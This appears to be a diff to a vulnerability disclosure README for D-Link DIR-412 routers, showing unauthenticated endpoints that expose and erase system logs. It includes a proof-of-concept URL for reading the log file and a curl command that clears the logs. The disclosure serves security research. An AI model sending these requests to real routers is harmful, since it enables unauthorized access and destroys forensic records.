@@ -4,11 +4,14 @@ There are some web interfaces without authentication requirements in D-Link rout
 Vulnerable targets include but are not limited to the lastest firmware versions of DIR-412(A1-1.14WW)   
 
 Poc1: http://targetip/log_get.php
+Attackers can get log file by this request.
 ![poc1](https://github.com/dahua966/Routers-vuls/blob/master/DIR-412/poc1.png)
 Poc2: curl -d "act=clear&logtype=sysact" "http://targetip/log_clear.php"
-![poc2](https://github.com/dahua966/Routers-vuls/blob/master/DIR-412/poc1.png)
+Attackers can clear log file by this request.
+![poc2](https://github.com/dahua966/Routers-vuls/blob/master/DIR-412/poc2.png)
 #### Acknowledgement
 Thanks to the partners who discovered the vulnerability together：
+Jian-bin Ye
 
 Wei Xie
 
